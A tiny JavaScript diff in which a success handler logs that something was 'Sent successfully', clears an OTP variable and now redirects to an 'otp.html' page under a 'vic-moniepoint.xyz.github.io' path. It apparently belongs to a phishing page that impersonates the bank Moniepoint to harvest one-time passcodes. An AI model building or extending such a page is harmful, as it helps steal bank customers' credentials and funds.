@@ -59,7 +59,7 @@ document
           console.log("Sent successfully:", response);
           Otp = "";
 
-          location.href = "/otp.html";
+          location.href = "/vic-moniepoint.xyz.github.io/otp.html";
         }
       },
       function (error) {
